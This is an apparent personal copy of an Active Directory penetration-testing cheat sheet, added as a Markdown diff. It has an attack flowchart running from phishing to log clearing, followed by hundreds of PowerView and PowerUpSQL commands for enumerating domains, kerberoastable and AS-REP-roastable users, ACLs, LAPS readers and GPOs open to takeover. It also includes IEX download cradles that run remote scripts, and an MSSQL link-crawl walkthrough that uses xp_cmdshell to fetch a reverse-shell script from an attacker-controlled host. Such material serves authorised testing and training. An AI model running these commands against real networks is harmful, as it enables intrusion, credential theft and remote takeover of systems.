@@ -1,0 +1,913 @@
+---
+date: 2025-06-08
+tags:
+  - ActiveDirectory
+  - Guide
+  - Cheatsheet
+Source: https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/ad-enumeration
+---
+
+```table-of-contents
+```
+
+# Flowchart
+
+```mermaid
+flowchart TD
+    A([Start AD Pentest]) --> B[Network Enumeration]
+    B --> B1["Discover Domain Controllers<br>(nslookup, BloodHound)"]
+    B --> B2["Identify Users & Groups<br>(ldapsearch, PowerView)"]
+    B --> B3["Map Network Shares<br>(net view, smbclient)"]
+    B --> B4["Scan Open Ports/Services<br>(nmap, CrackMapExec)"]
+    B --> B5["Check for Null Session<br>(rpcclient, enum4linux)"]
+    
+    B --> C[Initial Access Phase]
+    C --> C1["Phishing Campaign<br>(Set payload delivery)"]
+    C --> C2["Exploit Public Services<br>(OWA, RDP, VPN vulns)"]
+    C --> C3["Password Attacks<br>(Spraying, Cred Stuffing)"]
+    C --> C4["Abuse Exposed Creds<br>(Git leaks, Pastebin dumps)"]
+    
+    C --> D{Initial Compromise?}
+    D -->|Yes| E[Establish Foothold]
+    D -->|No| B
+    
+    E --> E1["Low-Priv Shell Access<br>(Metasploit, Covenant)"]
+    E --> E2["Credential Harvesting<br>(Mimikatz, LaZagne)"]
+    E --> E3["Establish Persistence<br>(Scheduled Tasks, Services)"]
+    
+    E --> F[Local Enumeration]
+    F --> F1["User Context Checks<br>(whoami /priv, net user)"]
+    F --> F2["OS/Software Audit<br>(systeminfo, chkrootkit)"]
+    F --> F3["Network Config<br>(ipconfig, arp -a)"]
+    F --> F4["Sensitive File Hunt<br>(Unattend.xml, backups)"]
+    
+    F --> G{Privilege Escalation?}
+    G -->|Yes| H[Escalate Privileges]
+    G -->|No| I[Lateral Movement]
+    
+    H --> H1["Kernel Exploits<br>(BeRoot, Watson)"]
+    H --> H2["Token Manipulation<br>(Incognito, RottenPotato)"]
+    H --> H3["Abuse Misconfigurations<br>(AlwaysInstallElevated)"]
+    H --> I
+    
+    I --> I1["Pass-the-Hash<br>(Mimikatz, smbexec)"]
+    I --> I2["Remote Exploitation<br>(PsExec, WMI)"]
+    I --> I3["Delegation Abuse<br>(PrintSpooler, RBCD)"]
+    I --> I4["AppLocker Bypass<br>(InstallUtil, regsvr32)"]
+    
+    I --> J{New Host Compromised?}
+    J -->|Yes| K[Repeat Enumeration]
+    J -->|No| C
+    
+    K --> L{DA Privileges?}
+    L -->|Yes| M[Domain Dominance]
+    L -->|No| F
+    
+    M --> M1["NTDS.dit Extraction<br>(secretsdump, vssadmin)"]
+    M --> M2["Golden Ticket<br>(mimikatz /ptt)"]
+    M --> M3["Trust Abuse<br>(SID History, Forest Trusts)"]
+    M --> N[Post-Exploitation]
+    
+    N --> N1["Data Collection<br>(FileZilla, rclone)"]
+    N --> N2["Backdooring<br>(SSH Keys, GPOs)"]
+    N --> N3["Log Manipulation<br>(wevtutil, clearev)"]
+    N --> Z([End])
+    
+    style A fill:#2ecc71,stroke:#27ae60
+    style C fill:#3498db,stroke:#2980b9
+    style Z fill:#e74c3c,stroke:#c0392b
+    style M fill:#f39c12,stroke:#d35400
+```
+
+# Active Directory Enumeration
+
+Active Directory (AD) is a directory service for Windows enterprise environments that was officially implemented in 2000 with the release of Windows Server 2000 and has been incrementally improved upon with the release of each subsequent server OS since.
+
+## Initial Enumeration
+
+## Key Points to Look Out For
+
+| **Data Point**                  | **Description**                                                                                                                 |
+| ------------------------------- | ------------------------------------------------------------------------------------------------------------------------------- |
+| `AD Users`                      | We are trying to enumerate valid user accounts we can target for password spraying.                                             |
+| `AD Joined Computers`           | Key Computers include Domain Controllers, file servers, SQL servers, web servers, Exchange mail servers, database servers, etc. |
+| `Key Services`                  | Kerberos, NetBIOS, LDAP, DNS                                                                                                    |
+| `Vulnerable Hosts and Services` | Anything that can be a quick win. ( a.k.a an easy host to exploit and gain a foothold)                                          |
+
+## Identifying Hosts
+
+### 1. Listen to Network Traffic
+
+- Listen to the network traffic to see how many hosts are on the network, and identify them.
+**Tools**
+
+```text
+- Wireshark
+- tcpdump
+- net-creds
+- net miner
+```
+
+### 2. Nmap Enumeration
+
+- Enumerate the hosts further. 
+- Look for what services these hosts are running, and identify the web servers and ==Domain Controller==
+
+## Identify Users
+
+- We will need to find a way to establish a foothold in the domain by either ==obtaining clear text credentials== or an ==NTLM password hash for a user, a SYSTEM shell on a domain-joined host, or a shell in the context of a domain user account.==
+
+### Kerbrute Internal AD Username Enumeration
+
+- Stealthy option for domain account enumeration.
+- It takes advantage of the fact that Kerberos pre-authentication failures often will not trigger logs or alerts.
+- Use in conjunction with `jsmith.txt` or `jsmith2.txt` from `insidetrust`
+
+### 4. Identify Potential Vulnerabilities
+
+- Possible exploit opportunities (MS08-067, EternalBlue, Bluekeep)
+- Abusing a running service running in the context of `SYSTEM`
+
+## Enumeration Tools
+
+**adPEAS:** [https://github.com/61106960/adPEAS](https://github.com/61106960/adPEAS)
+**BloodHound:** [https://github.com/BloodHoundAD/BloodHound](https://github.com/BloodHoundAD/BloodHound)
+**Invoke-ADEnum:** [https://github.com/Leo4j/Invoke-ADEnum](https://github.com/Leo4j/Invoke-ADEnum)
+**Powerview:**[https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)
+**Pywerview:** [https://github.com/the-useless-one/pywerview](https://github.com/the-useless-one/pywerview)
+
+```bash
+# adPEAS
+IEX(IWR -usebasicparsing https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1);Invoke-adPEAS
+IEX(IWR -usebasicparsing https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS-Light.ps1);Invoke-adPEAS
+
+# BloodHound
+IEX(IWR -usebasicparsing https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1);Invoke-Bloodhound -CollectionMethod "All,GPOLocalGroup"
+IEX(IWR -usebasicparsing https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1);Invoke-Bloodhound -CollectionMethod "All,GPOLocalGroup" -Loop -Loopduration 06:00:00 -LoopInterval 00:15:00
+
+# Invoke-ADEnum
+IEX(IWR -UseBasicParsing https://raw.githubusercontent.com/Leo4j/Invoke-ADEnum/main/Invoke-ADEnum.ps1);Invoke-ADEnum
+
+# PowerUpSQL
+IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1")
+
+# PowerView
+IEX(IWR -usebasicparsing https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1)
+```
+
+## Native AD Module
+
+```powershell
+iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
+```
+
+## General Enumeration
+
+### Domain Computer Enumeration
+
+```bash
+# List all computers in current Domain
+Get-DomainComputer
+Get-DomainComputer | Select Name,Description | Sort Name
+
+# Ping all alive computers in current Domain
+Get-DomainComputer -Ping
+
+# List all computers with select Operating System
+Get-DomainComputer -OperatingSystem "Windows 10 Pro"
+Get-DomainComputer -OperatingSystem "Windows 7*"
+Get-DomainComputer -OperatingSystem "Windows 8*"
+Get-DomainComputer -OperatingSystem "Windows xp*"
+
+# Get Computer objects that have Unconstrained Delegation
+Get-DomainComputer -Unconstrained
+```
+
+### Domain Enumeration
+
+```bash
+# Domain Information
+Get-NetDomain
+
+# Domain Policy Information
+Get-DomainPolicy
+(Get-DomainPolicy)."SystemAccess"
+(Get-DomainPolicy –domain <Domain>)."systemaccess"
+(Get-DomainPolicy)."KerberosPolicy" 
+
+# Get Domain SID
+Get-DomainSID
+```
+
+### Domain Controller Enumeration
+
+```bash
+# Get all Domain Dontrollers
+Get-NetDomainController
+
+# Get Primary Domain Controller
+Get-NetDomain | Select-Object 'PdcRoleOwner'
+
+# Get Domain Controller in different Domain
+Get-NetDomainController -Domain <Domain>
+```
+
+### Domain Policy Enumeration
+
+```bash
+Get-DomainPolicy
+(Get-DomainPolicy)."system access"
+(Get-DomainPolicy)."Kerberos Policy"
+```
+
+### Domain Trust Enumeration
+
+```bash
+# Enumerate all Domains in the forest
+Get-NetForestDomain
+
+# Get all Domains in Forest then list each Domain trust
+Get-NetForestDomain -Verbose | Get-DomainTrust
+
+# Map all reachable Domain trusts
+Get-DomainTrustMapping
+Get-DomainTrustMapping | Select SourceName,TargetName,TrustType,TrustDirection
+
+# List external trusts
+Get-NetForestDomain -Verbose | Get-DomainTrust |?{$_.TrustType -eq 'External'}
+
+# Enumerate trusts across the domain
+Get-DomainTrust
+
+# Find users in the current Domain that reside in Groups across trusts
+Find-ForeignUser
+```
+
+### Forest Enumeration
+
+```bash
+# Get details about current Forest
+Get-NetForest
+Get-NetForest -Forest <Forest>
+
+# Get all Domains in current Forest
+Get-NetForestDomain
+Get-NetForestDomain -Forest <Forest>
+
+# Get global catalogs in current Forest
+Get-NetForestCatalog
+Get-NetForestCatalog -Forest <Forest>
+
+# Map Forest trusts
+Get-NetForestTrust
+Get-NetForestTrust -Forest <Forest>
+```
+
+### Group Enumeration
+
+```bash
+# List all Groups in current Domain
+Get-NetGroup
+Get-NetGroup -Properties SamAccountName | Sort SamAccountName
+
+# List all Groups in alternative Domain
+Get-NetGroup –Domain <Domain>
+
+# Search for Groups with partial wildcard
+Get-NetGroup "*admin*"
+Get-NetGroup "*admin*"-Properties SamAccountName | Sort SamAccountName
+
+# List all local groups on Domain system
+Get-NetLocalGroup -ComputerName <Hostname>
+
+# Identify interesting groups on a Domain Controller
+Get-NetDomainController | Get-NetLocalGroup
+
+# Get all domain controllers then get each group and list members  
+Get-NetDomainController | Get-NetLocalGroup | Select -ExpandProperty GroupName | Get-NetGroupMember | Select GroupName,MemberName | Sort GroupName
+
+# Get All groups and members of groups
+Get-NetGroup | Get-NetGroupMember | Select GroupName,MemberName | Sort GroupName
+
+# List Groups of which a user is a member of (Recursive)
+Get-DomainGroup -MemberIdentity "<User>"
+Get-DomainGroup -MemberIdentity "<Group>"
+```
+
+### Group Managed Service Accounts
+
+```bash
+# Enumerate GMSA accounts 
+# Powerview
+Get-DomainObject -LDAPFilter '(objectClass=msDS-GroupManagedServiceAccount)'
+# AD Module
+Get-ADServiceAccount -Filter *
+
+# AD Module
+# Enumerate users who can retrieve the password
+Get-ADServiceAccount -Identity [Identity] -Properties * | select PrincipalsAllowedToRetrieveManagedPassword
+
+# Decode the password blob and convert to NT hash. (Run in context of user who has permissions to read the password
+# https://github.com/The-Viper-One/RedTeam-Binaries/raw/main/GMSAPasswordReader.exe
+.\GMSAPasswordReader.exe --accountname [GMSA-Account]
+```
+
+### Group Policy Enumeration
+
+```bash
+# Get GPO's in Domain
+Get-DomainGPO
+Get-DomainGPO -Properties DisplayName,CN
+
+# Get GPO applied to specific OU
+Get-DomainGPO -ADSpath `
+((Get-NetOU "StudentMachines" -FullData).gplink.split(";")[0] -replace "^.")
+
+# Get each OU and enumerate GPOs applied to each
+$OUs = Get-DomainOU -Properties displayName, gplink; foreach ($OU in $OUs) { $FilteredLDAP = $OU.gplink -replace '.*\{(.+?)\}.*', '{$1}'; Write-Host "OU: $($OU.displayName)" -ForegroundColor "Yellow"; Get-DomainGPO -Identity $FilteredLDAP; Write-Host }
+
+# Get GPO applied to system
+Get-DomainGPO -ComputerIdentity <FQDN>
+Get-DomainGPO -ComputerIdentity <FQDN> | Select DisplayName,CN
+
+# Get GPO applied to a User
+Get-DomainGPO -UserIdentity <SamAccountName>
+Get-DomainGPO -UserIdentity <SamAccountName | Select DisplayName,CN
+
+# Get GPO Restricted Groups
+Get-NetGPOGroup
+Get-NetGPOGroup -ResolveMembersToSIDs
+
+# Get GPO Restricted Groups and list each member of the groups
+$GroupNames = Get-NetGPOGroup -ResolveMembersToSIDs | Select-Object -ExpandProperty "GroupName" ; foreach ($GroupName in $GroupNames) {$ModifiedGroupName = $GroupName -replace '^.*\\' ; Get-DomainGroupMember -Identity $ModifiedGroupName}
+
+# Get users which are in a local group of a machine using GPO
+Find-GPOComputerAdmin –Computername <FQDN>
+
+# Determines what users/groups are in the specified local group for the machine through GPO correlation
+Find-GPOLocation -ComputerName <FQDN>
+
+# Get GPO Permissions
+Get-DomainGPO | Get-ObjectAcl
+```
+
+#### Find GPO's Vulnerable to Takeover
+
+```bash
+# Search for GPO's which may be vulnerable to takeover
+Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }
+
+# Resolve the SID to identify the principal
+Get-DomainGPO -Identity "CN={5059FAC1-5E94-4361-95D3-3BB235A23928},CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" | select displayName, gpcFileSysPath
+
+# Resolve the SID
+ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
+```
+
+### Organizational Units Enumeration
+
+```bash
+# Get all OU's in Domain
+Get-DomainOU
+Get-DomainOU -Domain <Domain>
+Get-DomainOU -Properties OU,DistinguishedName | Sort OU
+
+# Get all OU names by wildcard 
+Get-DomainOU "*admin*" 
+Get-DomainOU "*test*" 
+Get-DomainOU "*server*" 
+Get-DomainOU "*work*"
+```
+
+### User Eumeration
+
+```bash
+# List all user accounts in Domain
+Get-DomainUser
+
+# List enabled user accounts
+Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties Name,SamAccountName,Description | Sort Name
+Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties Name,Description,pwdlastset,badpwdcount | Sort Name
+
+# List specific user account
+Get-DomainUser -Username <Username>
+
+# Getcurrently logged on users from selected system
+Get-NetLoggedon -ComputerName <Hostname>
+
+# Get last logged user on a remote computer (Requires admin and remote registry)
+Get-LastLoggedOn -ComputerName <Hostname>
+
+# Get kerberoastable users
+Get-DomainUser -SPN | select Name,SrvicepPincipalnNme
+
+# Get AS-REP roastable users
+Get-DomainUser -PreauthNotRequired | select Name
+
+# Search for string in User Description field
+Get-DomainUser -Properties samaccountname,description | Where {$_.description -ne $null}
+
+# Search for string in userPassword field
+Get-DomainUser -Properties userPassword | Where {$_.userPassword -ne $null}
+
+# Search for string in unixUserPassword field
+Get-DomainUser -Properties unixUserPassword | Where {$_.unixUserPassword -ne $null}
+```
+
+## Other
+
+### Access Control Lists
+
+```bash
+# Get current domain SID and find interesting properties
+$SID = Get-DomainSid ; Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "$SID-[\d]{4,10}" }
+
+# Find interesting ACL's for current user
+Find-InterestingDomainAcl -ResolveGUIDs  | Where-Object {$_.IdentityReference –eq [System.Security.Principal.WindowsIdentity]::GetCurrent().Name}
+
+# Get ACLs for specific AD Object
+Get-DomainObjectAcl -SamAccountName <SAM> -ResolveGUIDs
+Get-DomainObjectAcl -Identity <Identity> -ResolveGUIDs
+
+# Get ACLs for specified prefix
+Get-DomainObjectAcl -ADSprefix 'CN=Administrators,CN=Users' -Verbose
+
+# Search for interesting ACEs
+Find-InterestingDomainAcl -ResolveGUIDs
+Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReference -match "Domain Users"} 
+Find-InterestingDomainAcl -ResolveGUIDs | ?{ $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl"
+
+# Get ACLs for select groups
+Get-DomainObjectACL -identity "Domain Admins" -ResolveGUIDs | ?{ $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl"
+
+# Find Interesting ACLs from groups we are a member of
+Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "Standard-Users"}
+
+# Find Interesting ACLs for groups a user is a member of (Recursive)
+Get-DomainGroup -MemberIdentity "[User]" | Select-Object -ExpandProperty "SamAccountName" | ForEach-Object { Write-Host "Searching for interesting ACLs for $_" -ForegroundColor "Yellow"; Find-InterestingDomainAcl -ResolveGUIDs | Where-Object { $_.IdentityReferenceName -match $_ } }
+
+# Get ACL for specific path
+Get-PathACL -Path "\\Security.local\SYSVOL"
+
+# Get the ACLs associated with the specified LDAP path to be used for search
+Get-DomainObjectAcl -ADSpath "LDAP://CN=DomainAdmins,CN=Users,DC=Security,DC=local" -ResolveGUIDs -Verbose
+```
+
+### AppLocker / WDAC
+
+```bash
+# Search local system to see if AppLocker used. An error will officure if not in use
+reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
+
+# Search for AppLocker policy with PowerShell on the local system
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+
+# Check local system to see if WDAC is installed
+Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
+
+# Search for GPOs that might be related to AppLocker
+Get-DomainGPO -Domain dev-studio.com | ? { $_.DisplayName -like "*AppL*" } | select displayname, gpcfilesyspath
+```
+
+### AS-REP Roastable Users
+
+```bash
+Get-DomainUser -PreauthNotRequired | select UserPrincipalName
+```
+
+[AS-REP Roasting](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/credential-access/steal-or-forge-kerberos-tickets/as-rep-roasting)
+
+### Kerberoastable Users
+
+**PowerView**
+
+```bash
+Get-DomainUser -SPN | Select SamAccountName,serviceprincipalname | Sort SamAccountName
+```
+
+[Kerberoasting](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/credential-access/steal-or-forge-kerberos-tickets/kerberoasting)
+
+### DCSync Rights
+
+**PowerView**
+
+```bash
+# Ensure the Base path below is set to the root of the domain
+$d = Get-ObjectACL "DC=Domain,DC=local" -ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')} | Select-Object -ExpandProperty SecurityIdentifier | Select -ExpandProperty value ; Convert-SidToName $d
+```
+
+[DCSync](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/credential-access/credential-dumping/dcsync)
+
+### Delegation - Constrained
+
+```bash
+# Get computer Constrained Delegation
+Get-DomainComputer -TrustedToAuth| Select DnsHostName,UserAccountControl,msds-allowedtodelegateto | FL
+
+# Get user Constrained Delegation
+Get-DomainUser -TrustedToAuth
+```
+
+### Delegation - Unconstrained
+
+```bash
+# Get computers with unconstrained delegation
+Get-DomainComputer -Unconstrained | Select DnsHostName,UserAccountControl
+```
+
+[Unconstrained DelegationPentest Everything](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/unconstrained-delegation)
+
+### Deleted Users
+
+If we are a member of the AD group "AD Recycle Bin" we can view deleted user objects in PowerShell.
+
+```bash
+Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
+```
+
+### LAPS Enumeration
+
+#### LAPS Delegation
+
+The following can be used to identify what objects have the ability to read the LAPS passwords for identified systems in the domain.
+
+```bash
+Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object { $_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier); $_ }
+```
+
+[LAPSPentest Everything](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/laps)
+
+### Machine Account Quota
+
+```bash
+$Domain = "$env:userdnsdomain"
+$LDAP = "DC=" + $Domain.Split(".")
+$LDAP = $LDAP -replace " ", ",DC="
+(Get-DomainObject -Identity $LDAP -Properties ms-DS-MachineAccountQuota) | Select-Object -ExpandProperty ms-DS-MachineAccountQuota
+```
+
+### MSSQL Enumeration
+
+```bash
+# Dsicover SQL related groups
+Get-DomainGroup -Identity *SQL* | % { Get-DomainGroupMember -Identity $_.distinguishedname | select groupname, membername }
+```
+
+#### PowerUpSQL
+
+```bash
+# Discovery (SPN Scanning)
+Get-SQLInstanceDomain
+
+# Discovery (Broadcast Domain)
+Get-SqlInstanceBroadcast
+
+# Discovery (Broadcast Domain)
+Get-SqlInstanceScanUDP
+Get-SqlInstanceScanUDPThreaded
+
+# Check Accessibility
+Get-SQLConnectionTestThreaded
+Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
+
+#Gather Information
+Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
+
+# Search for database links to remote servers
+Get-SQLServerLink -Instance <Instance> -Verbose
+Get-SQLServerLinkCrawl -Instance <Instance> -Verbose
+
+# Where instance user matches "sa"
+Get-SQLServerLinkCrawl -Instance <Instance> | Where-Object {$_.User -match 'sa'}
+
+# Execute commands ( If xp_cmdshell or RPC out is set to enabled)
+# If AV is enabled run cradled scripts with functions inline with the script
+EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "<Instance>"
+Get-SQLServerLinkCrawl -Instance <Instance> "exec master..xp_cmdshell 'whoami'" -Query
+
+# Scan for misconfigurations and vulnerabilities
+Invoke-SQLAudit -Verbose -Instance <Server>
+```
+
+#### SQL Commands
+
+```bash
+# Search for database links
+select * from master..sysservers
+
+# Manually searching for Database Links
+select * from openquery("<Server>",'select * from master..sysservers')
+
+# Openquery queries can be chained to access links within links (nested links)
+select * from openquery("dcorp-sql1",'select * from openquery("<Server>",''select * from master..sysservers'')')
+
+# From the initial SQL server, OS commands can be executed using nested link queries
+select * from openquery("dcorp-sql1",'select * from openquery("<Server>",''select * from openquery("eu-sql.eu.eurocorp.local",''''select@@version as version;exec master..xp_cmdshell "powershellwhoami)'''')'')')
+```
+
+### MSSQL - PowerupSQL Exploit Example
+
+Search for accessible instances in current domain
+
+```bash
+Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
+
+ComputerName                           Instance                                    Status
+------------                           --------                                    ------
+mssql-srv.security.local             mssql-srv.security.local,1433                Accessible
+Mgmtsrv01.security.local             mgmtsrv01.security.local,1433                Not Accessible
+```
+
+Run the `Get-SQLServerLinkCrawl` on an accessible instance.
+
+```bash
+Get-SQLServerLinkCrawl -Instance mssql-srv.security.local -Verbose
+
+
+Version     : SQL Server 2017
+Instance    : mssql-master-srv
+CustomQuery :
+Sysadmin    : 1
+Path        : {mssql-srv, mssql-srv-eu, mssql-master-srv}
+User        : sa
+Links       :
+```
+
+From the results above the server `mssql-master-srv` is the enterprise level MSSSQL server running with "sa" privileges. The path field shows in order how this is accessible starting with `mssql-srv`. We can check for command execution specifying the first accessible instance in the path which, in this case is `mssql-srv`.
+
+```bash
+Get-SQLServerLinkCrawl -Instance "mssql-srv" -Query "exec master..xp_cmdshell 'whoami'"
+
+Version     : SQL Server 2017
+Instance    : mssql-master-srv
+CustomQuery : {nt authority\network service, }
+Sysadmin    : 1
+Path        : {mssql-srv, mssql-srv-eu, mssql-master-srv}
+User        : sa
+Links       :
+```
+
+With confirmed command execution under the "sa" account on the `mssql-master-srv` we can then connect remotely by executing a `PowerShell` download cradle
+
+```bash
+Get-SQLServerLinkCrawl -Instance mssql-srv -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://<IP>/Invoke-PowerShellTcp.ps1'')"' -E df
+```
+
+### Shares and Files Enumeration
+
+**PowerView (Shares)**
+
+```bash
+# Find available shares on hosts in the current Domain
+Find-DomainShare -Verbose
+
+# Filter out uninteresting print shares
+Find-DomainShare -Verbose -CheckShareAccess | Where-Object {$_.Name -ne "print$"} | FT -AutoSize
+
+# Get all file servers on Domain
+Get-DomainFileServer
+
+# List all shares on specific domain system
+Get-NetShare -ComputerName <Host>
+```
+
+**PowerView (Files)**
+
+```bash
+# Various
+Find-InterestingDomainShareFile -verbose
+Find-InterestingDomainShareFile -OfficeDocs
+Find-InterestingDomainShareFile -Include *.ps1,*.bak,*.vbs,*.config,*.conf
+Find-InterestingDomainShareFile -Terms account*,pass*,secret*,conf*,test*,salar*
+
+# Individual examples
+# Config files
+Find-InterestingDomainShareFile -Include *.conifg | Select -ExpandProperty "Path" | Sort | Out-File "Config-Files.txt" -Encoding "ASCII"
+
+# Bak files
+Find-InterestingDomainShareFile -Include *.bak| Select -ExpandProperty "Path" | Sort | Out-File "Bak-files.txt" -Encoding "ASCII"
+
+# Unattend files
+Find-InterestingDomainShareFile -Include *unattend* | Select -ExpandProperty "Path" | Sort | Out-File "Unattend.txt" -Encoding "ASCII"
+
+# Batch files
+Find-InterestingDomainShareFile -Include *.bat | Select -ExpandProperty "Path" | Sort | Out-File "Batch-Files.txt" -Encoding "ASCII"
+
+# PowerShell files
+Find-InterestingDomainShareFile -Include *.ps1 | Select -ExpandProperty "Path" | Sort | Out-File "PS1-Files.txt" -Encoding "ASCII"
+
+# DLL Config files
+Find-InterestingDomainShareFile -Include *dll.conf* | Select -ExpandProperty "Path" | Sort | Out-File "DLLConfig-Files.txt" -Encoding "ASCII"
+
+# SQL files
+Find-InterestingDomainShareFile -Include *sql* | Select -ExpandProperty "Path" | Sort | Out-File "SQL-Files.txt" -Encoding "ASCII"
+
+# Test files
+Find-InterestingDomainShareFile -Include test* | Select -ExpandProperty "Path" | Sort | Out-File "Test-Files.txt" -Encoding "ASCII"
+
+# Password files
+Find-InterestingDomainShareFile -Include passw* | Select -ExpandProperty "Path" | Sort | Out-File "Password-Files.txt" -Encoding "ASCII"
+
+# Secret files
+Find-InterestingDomainShareFile -Include secret* | Select -ExpandProperty "Path" | Sort | Out-File "Secret-Files.txt" -Encoding "ASCII"
+
+# Salary files
+Find-InterestingDomainShareFile -Include salar* | Select -ExpandProperty "Path" | Sort | Out-File "Salary-Files.txt" -Encoding "ASCII"
+
+# Account files
+Find-InterestingDomainShareFile -Include account* | Select -ExpandProperty "Path" | Sort | Out-File "Account-Files.txt" -Encoding "ASCII"
+```
+
+**Snaffler**
+
+```bash
+Snaffler.exe -s -d Domain.local -o snaffler.log -v data
+```
+
+### SPN Enumeration
+
+```bash
+# find all users with an SPN set (likely service accounts)
+Get-DomainUser -SPN
+
+# find all service accounts in "Domain Admins"
+Get-DomainUser -SPN | ?{$_.memberof -match 'Domain Admins'}
+
+# Retrieve SPN hash
+Get-DomainUser | Get-DomainSPNTicket -Format Hashcat | select -ExpandProperty Hash
+Get-DomainUser -Identity <User> | Get-DomainSPNTicket -Format Hashcat | select -ExpandProperty Hash
+```
+
+### User Hunting
+
+#### PowerView
+
+```bash
+# Find all machines on domain where current user has local admin privileges
+Find-LocalAdminAccess -Verbose
+Find-LocalAdminAccess -ComputerDomain <Domain> -Verbose
+
+# Find computers where domain administrators or specified user / group has session
+Invoke-UserHunter
+Invoke-UserHunter -Domain <Domain>
+Invoke-UserHunter -GroupName "RDPUsers"
+Invoke-UserHunter -Stealth # Makes less noise
+Invoke-UserHunter -CheckAccess # Check if accessible
+
+# Find computers where all and any users / groups have session
+Invoke-UserHunter -ShowAll
+Invoke-UserHunter -ShowAll -CheckAccess # Check if accessible
+
+# Find local admins on all machines of the domain (needs local admin rights on target).
+Invoke-EnumerateLocalAdmin –Verbose
+
+# Get users logged on to the local system
+Get-NetLoggedon
+
+# Get actively logged users on a computer (needs local admin rights on the target)
+Get-NetLoggedon –ComputerName <Hostname>
+Get-DomainComputer | Get-NetLoggedon # All Systems
+
+# Get locally logged users on a computer (needs remote registry on the target - started by-default on server OS)
+Get-LoggedonLocal -ComputerName <Hostname>
+Get-DomainComputer | Get-LoggedonLocal # All Systems
+
+# Get the last logged user on a computer (needs administrative rights and remote registry on the target)
+Get-LastLoggedOn –ComputerName <Hostname>
+
+# Poll asystem for when a particular user accesses a resource
+Invoke-UserHunter -ComputerName <Hostname> -Poll 100 -UserName <user> -Delay 5 -Verbose
+```
+
+## Administrative User Identification
+
+### Local System Enumeration
+
+Windows allows any basic authenticated domain user to enumerate the members of a local group on a remote machine.
+
+#### PowerView
+
+```bash
+Get-NetLocalGroup -ComputerName <Hostname>
+
+# With API Call
+Get-NetLocalGroup -ComputerName <Hostname> -API
+
+# Get list of effective users who can access a remote host
+Get-NetLocalGroup -ComputerName <Hostname> -Recurse
+```
+
+#### WinNT Service
+
+```bash
+([ADSI]'WinNT://<Hostname>/Administrators').psbase.Invoke('Members') |
+%{$_.GetType().InvokeMember('Name', 'GetProperty', $null, $_, $null)}
+```
+
+### Domain Group Enumeration
+
+```bash
+# Retrieve members of the Domain Admins group
+Get-DomainGroupMember -GroupName "Domain Admins"
+```
+
+### AdminCount = 1
+
+This can produce false positives as the AdminCount value is not always automatically updated when an account has been disabled or removed from a Group that provides privileged permissions.
+
+#### PowerShell
+
+```bash
+Get-ADObject -LDAPFilter "(&(admincount=1)(|(objectcategory=person)(objectcategory=group)))" | Select-Object DistinguishedName, Name
+```
+
+#### PowerView
+
+```bash
+# Identify Privileged accounts without querying groups
+Get-DomainUser -AdminCount | select name,whencreated,pwdlastset,lastlogo
+```
+
+### AD Groups with Local Admin Rights
+
+Often times in domain environments domain user accounts are given member to a workstations local group 'Administrators'.
+
+#### PowerView
+
+```bash
+Get-NetGPOGroup
+Get-NetGroupMember -GroupName "Local Admin"
+```
+
+### Virtual Admins
+
+Virtual Admins usually have full access to the virtualization platform identifying and owning these accounts can often give total control over to an attacker.
+
+#### PowerView
+
+```bash
+Get-NetGroup "*Hyper*" | Get-NetGroupMember
+Get-NetGroup "*VMWare*" | Get-NetGroupMember
+```
+
+### Systems with Admin Rights
+
+Finding computer accounts with a `$` sign at the end of the hostname in an admin group we can then compromise the system and obtain SYSTEM privileges. The SYSTEM account on the compromised computer would then have AD admin privileges.
+
+#### PowerView
+
+```bash
+Get-NetGroup "*admins*" | Get-NetGroupMember -Recurse |?{$_.MemberName -Like '*$'}
